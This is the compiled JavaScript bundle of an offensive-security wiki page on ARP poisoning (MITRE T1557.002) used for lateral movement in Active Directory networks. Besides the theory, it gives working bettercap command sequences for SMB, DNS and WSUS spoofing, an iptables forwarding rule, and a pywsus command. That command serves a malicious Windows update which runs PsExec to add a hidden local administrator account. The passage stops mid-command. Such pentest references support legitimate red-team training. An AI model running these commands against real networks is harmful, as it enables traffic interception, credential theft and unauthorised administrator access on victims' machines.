import{_ as h,c as p,a5 as o,G as t,w as a,B as l,o as k,j as s,a as e}from"./chunks/framework.B5CpDqM0.js";const d="/assets/arpspoofandipspoof.D71oS0YM.png",C=JSON.parse('{"title":"ARP poisoning","description":"MITRE ATT&CK‚Ñ¢ Sub-technique T1557.002","frontmatter":{"description":"MITRE ATT&CK‚Ñ¢ Sub-technique T1557.002","authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/arp-poisoning.md","filePath":"ad/movement/mitm-and-coerced-authentications/arp-poisoning.md","lastUpdated":1724982529000}'),c={name:"ad/movement/mitm-and-coerced-authentications/arp-poisoning.md"};function g(F,i,y,u,f,b){const n=l("PluginTabsTab"),r=l("PluginTabs");return k(),p("div",null,[i[4]||(i[4]=o('<h1 id="arp-poisoning" tabindex="-1">ARP poisoning <a class="header-anchor" href="#arp-poisoning" aria-label="Permalink to &quot;ARP poisoning&quot;">‚Äã</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><p>The ARP (Address Resolution Protocol) is used to link IPv4 addresses with MAC addresses, allowing machines to communicate within networks. Since that protocol works in broadcast, attackers can try to impersonate machines by answering ARP requests (<em>&quot;Who is using address 192.168.56.1? I am!&quot;</em>) or by flooding the network with ARP announcements (<em>&quot;Hey everyone, nobody asked but I&#39;m the one using address 192.168.56.1&quot;</em>). This is called ARP spoofing (also called ARP poisoning).</p><div class="tip custom-block"><p>ARP Reply is accepted by a host without any verification, even if it didn‚Äôt send an ARP request ! (for performance purpose). The ARP table is being updated if the reply is different from the actual entry.</p></div><h3 id="proxy-vs-rerouting" tabindex="-1">Proxy vs. Rerouting <a class="header-anchor" href="#proxy-vs-rerouting" aria-label="Permalink to &quot;Proxy vs. Rerouting&quot;">‚Äã</a></h3><p>The two major use cases of ARP spoofing are the following.</p><ol><li><strong>Proxy</strong>: intercepting, forwarding and snooping or tampering with packets exchanged between a client and a server. This technique usually implies that the attacker has to poison the client&#39;s ARP table and replace the server&#39;s MAC address in it by its own, but also the server&#39;s ARP table (or the gateway&#39;s depending on the <a href="./arp-poisoning#network-topology">network topology</a>) to replace the client&#39;s MAC address in it by its own. Outgoing and incoming packets then get intercepted and can be tampered with or spied on.</li><li><strong>Rerouting</strong>: Intercepting a set of packets sent by a client to a server and forwarding them to an evil server. This technique implies that the attacker only has to poison the client&#39;s ARP table and replace the server&#39;s MAC address in it by its own. The attacker then has to have an evil server capable of behaving like the spoofed one.</li></ol><h3 id="attack-scenarios" tabindex="-1">Attack scenarios <a class="header-anchor" href="#attack-scenarios" aria-label="Permalink to &quot;Attack scenarios&quot;">‚Äã</a></h3><p>There are multiple scenarios where ARP spoofing can be used to operate lateral movement within Active Directory domains (not an comprehensive list).</p><ol><li><a href="./../ntlm/capture">NTLM capture</a> and <a href="./../ntlm/relay">NTLM relay</a> : spoof an SMB server and reroute received SMB packets to internal capture or relay servers (rerouting technique).</li><li><a href="./dns-spoofing">DNS spoofing</a> : spoof an internal DNS server, so that DNS queries can be answered with fake resolutions (rerouting technique).</li><li><a href="./wsus-spoofing">WSUS spoofing</a> : spoof the WSUS server and deliver evil configurations to Windows clients. This can either be done by intercepting all update request and running a fully functional WSUS server (rerouting technique) or by intercepting, forwarding and tampering packets between clients and the legitimate WSUS server (proxy technique).</li><li><a href="./../credentials/dumping/network-protocols">Dumping network secrets</a> : reroute any traffic and dump secrets that were insecurely sent (i.e. FTP, HTTP, SMTP, ...). In this scenario, both outgoing and incoming traffic should be captured. This implies the poisoning of both the client&#39;s and the server&#39;s ARP tables (proxy technique).</li></ol><h3 id="network-topology" tabindex="-1">Network topology <a class="header-anchor" href="#network-topology" aria-label="Permalink to &quot;Network topology&quot;">‚Äã</a></h3><p>Besides the scenarios mentioned above, many network topologies exist and ARP poisoning attacks need to be carefully prepared based on that topology. Below are some common examples.</p><ol><li>One segment: the client, the server, and the attacker are on the same network segment. The ARP tables can be poisoned with the attacker spoofing either the client or the server.</li><li>Two segments: the client and the attacker are on the same network segment but the server is on another one. For a hijacking attack, the client&#39;s ARP table can be poisoned with the attacker posing as the client&#39;s gateway. For a relaying attack, the gateway&#39;s ARP table also has to be poisoned with the attacker posing as the client.</li><li>Three segments: all three machines are on different network segments. For both hijacking and relaying attacks, I&#39;m not sure what can be done... ü§∑‚Äç‚ôÇÔ∏è</li></ol><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2><div class="warning custom-block"><p>Since spoofing every address in a subnet can cause temporary but severe disruption in that subnet, it is highly recommended to target specific addresses and machines while doing ARP spoofing.</p></div><p>The best tool to operate ARP poisoning is <a href="https://www.bettercap.org/" target="_blank" rel="noreferrer">bettercap</a> (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.</p><h3 id="networking" tabindex="-1">Networking <a class="header-anchor" href="#networking" aria-label="Permalink to &quot;Networking&quot;">‚Äã</a></h3><p>In order to forward packets, the system has to be prepared accordingly. The first step is to make sure the system firewall can effectively forward packets. The easiest way of achieving this is to write an <code>ACCEPT</code> policy in the <code>FORWARD</code> chain.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">iptables</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --policy</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> FORWARD</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ACCEPT</span></span></code></pre></div><h3 id="arp-poisoning-1" tabindex="-1">ARP poisoning <a class="header-anchor" href="#arp-poisoning-1" aria-label="Permalink to &quot;ARP poisoning&quot;">‚Äã</a></h3><p>Bettercap&#39;s <a href="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" target="_blank" rel="noreferrer">arp.spoof</a> module has multiple options that allow multiple scenarios</p><ul><li><code>arp.spoof.targets</code> is the list of targets whose ARP tables will be poisoned</li><li><code>arp.spoof.internal</code> is an option that allows bettercap to choose which addresses to spoof. If set to <code>true</code>, machines from the same subnet as the client victim will be spoofed (i.e. their IP addresses will be matched to the attacker&#39;s MAC address on the victim client&#39;s ARP table). To put it simply, this option needs to be set to <code>true</code> when the attacker wants to be the man-in-the-middle between two machines of a same subnet. When the victim client and the spoofed server are on different subnets, this option can be left to <code>false</code>.</li><li><code>arp.spoof.fullduplex</code> is an option that, when set to <code>true</code>, will make bettercap automatically try to poison the gateway&#39;s ARP table so that packets aimed at the victim client also get intercepted.</li><li><code>arp.spoof</code> is a trigger to set to <code>on</code> when starting the ARP poisoning, <code>off</code> when stopping it. This trigger will also enable packets forwarding (i.e. write <code>1</code> in <code>/proc/sys/net/ip/ip_forward</code>) while the <code>arp.ban</code> trigger will disabled that and the poisoned victim will not have access to the spoofed machines anymore.</li></ul><h3 id="packet-forwarding" tabindex="-1">Packet forwarding <a class="header-anchor" href="#packet-forwarding" aria-label="Permalink to &quot;Packet forwarding&quot;">‚Äã</a></h3><p>Bettercap also has the <a href="https://www.bettercap.org/modules/ethernet/proxies/any.proxy/" target="_blank" rel="noreferrer">any.proxy</a> module that has multiple options to allows multiple scenarios</p><ul><li><code>any.proxy.iface</code> allows to set the interface to redirect packets from</li><li><code>any.proxy.protocol</code> can be set to <code>UDP</code> or <code>TCP</code> to specify on which transport protocol the packets to reroute will transit</li><li><code>any.proxy.src_address</code> refers to the destination address of the packets to reroute. This usually has to be set to the spoofed server IP address. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.This option can be blank. Bettercap will then reroute every packet received without filtering on the address. For instance, this is useful when doing a WSUS or DNS spoofing attack on multiple victims at the same time.</li><li><code>any.proxy.src_port</code> refers to the destination port of the packets to reroute. This usally has to be set to the spoofed service port. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.</li><li><code>any.proxy.dst_address</code> refers to the IP address the matched packets are to be sent to. For instance, when doing WSUS or DNS spoofing attacks in a rerouting technique mode, this option has to be set to the IP address of the attacker&#39;s server.</li><li><code>any.proxy.dst_port</code> refers to the port the matched packets are to be sent to.</li></ul><h3 id="üõ†Ô∏è-bettercap-logging" tabindex="-1">üõ†Ô∏è Bettercap logging <a class="header-anchor" href="#üõ†Ô∏è-bettercap-logging" aria-label="Permalink to &quot;üõ†Ô∏è Bettercap logging&quot;">‚Äã</a></h3><p>Bettercap&#39;s logging can be controlled so that only essential information is shown. Becoming a man-in-the-middle can be a little overwhelming when not filtering the info shown to the user.</p><ul><li>events.ignore TODO //</li></ul><h3 id="üõ†Ô∏è-tips-tricks" tabindex="-1">üõ†Ô∏è Tips &amp; tricks <a class="header-anchor" href="#üõ†Ô∏è-tips-tricks" aria-label="Permalink to &quot;üõ†Ô∏è Tips &amp; tricks&quot;">‚Äã</a></h3><ul><li>wireshark, make sure forwarded packets appear twice, one with MAC 1 -&gt; MAC 2, one with MAC 2 -&gt; MAC 3 (1=victim, 2=attacker, 3=gateway)</li><li>Make sure the attacker and the victim client are on the same subnet, I don&#39;t know how to operate when they are not</li><li>tracert on the client to make sure packets are forwarded if possible</li><li>make sure it&#39;s not the DNS</li><li>make sure the iptables rules are ok and allow forwarding --&gt; <a href="./arp-poisoning#networking">networking</a></li><li>make sure to run bettercap in a privileged container with network host</li><li>options can be written in a <code>.cap</code> file and launched with bettercap with the following command and options<code>bettercap --iface $interface --caplet caplet.cap</code></li></ul><h2 id="scenarios-examples" tabindex="-1">Scenarios examples <a class="header-anchor" href="#scenarios-examples" aria-label="Permalink to &quot;Scenarios examples&quot;">‚Äã</a></h2><p>Below are examples or targeted ARP poisoning attacks where the attacker wants to hijack packets aimed at a specific server (SMB, DNS, WSUS, ...), to answer with evil responses. The &quot;dumping network secrets&quot; scenario is the one attackers use to <a href="./../credentials/dumping/network-protocols">dump credentials on the network</a> (usually in order to find an initial foothold).</p>',32)),t(r,null,{default:a(()=>[t(n,{label:"SMB spoofing"},{default:a(()=>i[0]||(i[0]=[s("p",null,[e("Start the SMB server for "),s("a",{href:"./../ntlm/capture"},"capture"),e(" or "),s("a",{href:"./../ntlm/relay"},"relay"),e(" then start the poisoning attack.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# quick recon of the network")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.probe"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# set the ARP spoofing")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.targets"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $client_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.internal"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," false")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.fullduplex"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," false")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# reroute traffic aimed at the original SMB server")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.iface"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $interface")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.protocol"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," TCP")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.src_address"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $SMB_server_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.src_port"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 445")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.dst_address"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $attacker_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.dst_port"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 445")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# control logging and verbosity")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," endpoint")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," net.sniff.mdns")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# start the modules")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"any.proxy"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"arp.spoof"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.sniff"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")])])])],-1)])),_:1}),t(n,{label:"DNS spoofing"},{default:a(()=>i[1]||(i[1]=[s("p",null,[e("Start the DNS server ("),s("a",{href:"https://github.com/lgandx/Responder",target:"_blank",rel:"noreferrer"},"responder"),e(", "),s("a",{href:"https://github.com/iphelix/dnschef",target:"_blank",rel:"noreferrer"},"dnschef"),e(", or "),s("a",{href:"https://github.com/bettercap/bettercap",target:"_blank",rel:"noreferrer"},"bettercap"),e(") for "),s("a",{href:"./dns-spoofing"},"DNS poisoning"),e(" then start the ARP poisoning attack.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# quick recon of the network")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.probe"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# set the ARP spoofing")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.targets"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $client_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.internal"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," false")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.fullduplex"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," false")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# reroute traffic aimed at the original DNS server")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.iface"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $interface")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.protocol"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," UDP")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.src_address"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DNS_server_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.src_port"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 53")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.dst_address"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $attacker_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.dst_port"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 53")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# control logging and verbosity")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," endpoint")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," net.sniff.mdns")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# start the modules")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"any.proxy"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"arp.spoof"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.sniff"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")])])])],-1)])),_:1}),t(n,{label:"WSUS spoofing"},{default:a(()=>i[2]||(i[2]=[s("p",null,[e("ARP poisoning for "),s("a",{href:"./wsus-spoofing"},"WSUS spoofing "),e("in a two-subnets layout (attacker + client in the same segment, legitimate WSUS server in another one). Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.")],-1),s("p",null,[e("The evil WSUS server needs to be started before doing ARP poisoning. The "),s("a",{href:"https://github.com/GoSecure/pywsus",target:"_blank",rel:"noreferrer"},"pywsus "),e("(Python) utility can be used for that matter.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"python3"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," pywsus.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $network_facing_ip "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--port"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 8530"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --executable"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /path/to/PsExec64.exe"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --command"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},` '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'`)])])])],-1),s("p",null,"Once the WSUS server is up and running, the ARP poisoning attack can start.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# quick recon of the network")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.probe"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# set the ARP spoofing")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.targets"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $client_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.internal"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," false")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.fullduplex"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," false")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# reroute traffic aimed at the WSUS server")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.iface"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $interface")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.protocol"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," TCP")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.src_address"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $WSUS_server_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.src_port"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 8530")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.dst_address"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $attacker_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," any.proxy.dst_port"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 8530")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# control logging and verbosity")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," endpoint")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," net.sniff.mdns")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# start the modules")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"any.proxy"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"arp.spoof"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
